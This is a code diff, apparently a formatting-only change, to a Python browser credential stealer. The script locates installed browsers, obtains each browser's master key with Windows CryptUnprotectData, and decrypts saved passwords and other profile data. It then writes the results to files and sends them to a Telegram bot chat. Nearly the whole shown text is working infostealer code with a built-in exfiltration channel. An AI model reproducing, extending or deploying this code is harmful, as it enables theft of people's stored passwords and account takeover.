@@ -35,7 +35,6 @@ data_queries = {
     },
 }
 
-
 # Function to get the master key for decryption
 def get_master_key(path: str):
     if not os.path.exists(path):
@@ -50,7 +49,6 @@ def get_master_key(path: str):
     key = CryptUnprotectData(key, None, None, None, 0)[1]
     return key
 
-
 # Function to decrypt the password
 def decrypt_password(buff: bytes, key: bytes) -> str:
     iv = buff[3:15]
@@ -59,7 +57,6 @@ def decrypt_password(buff: bytes, key: bytes) -> str:
     decrypted_pass = cipher.decrypt(payload)
     decrypted_pass = decrypted_pass[:-16].decode()
     return decrypted_pass
-
 
 # Function to save the results to a file
 def save_results(browser_name, type_of_data, content):
@@ -72,7 +69,6 @@ def save_results(browser_name, type_of_data, content):
         print(f"\t [*] Saved in {file_path}")
     else:
         print(f"\t [-] No Data Found!")
-
 
 # Function to get the data from the database
 def get_data(path: str, profile: str, key, type_of_data):
@@ -105,13 +101,11 @@ def get_data(path: str, profile: str, key, type_of_data):
     os.remove("temp_db")
     return result
 
-
 # Function to convert Chrome time to a readable format
 def convert_chrome_time(chrome_time):
     return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime(
         "%d/%m/%Y %H:%M:%S"
     )
-
 
 # Function to check which browsers are installed
 def installed_browsers():
@@ -120,7 +114,6 @@ def installed_browsers():
         if os.path.exists(browsers[x]):
             available.append(x)
     return available
-
 
 # Function to send a message to Telegram
 def send_telegram_message(bot_token, chat_id, message):
@@ -140,7 +133,6 @@ def send_telegram_message(bot_token, chat_id, message):
         # If the message is short enough, send it directly
         bot.sendMessage(chat_id, message)
 
-
 if __name__ == "__main__":
     available_browsers = installed_browsers()
     chat_id = ""  # Replace with your Telegram chat ID
@@ -154,8 +146,12 @@ if __name__ == "__main__":
             data = get_data(browser_path, "Default", master_key, data_type)
             if data:
                 print(data)  # Display data to the console
-                save_results(browser, data_type_name, data)  # Save data to a text file
-                send_telegram_message(bot_token, chat_id, data)  # Send data to Telegram
+                save_results(
+                    browser, data_type_name, data
+                )  # Save data to a text file
+                send_telegram_message(
+                    bot_token, chat_id, data
+                )  # Send data to Telegram
             else:
                 print("\t [-] No Data Found!")
             print("\t------\n")
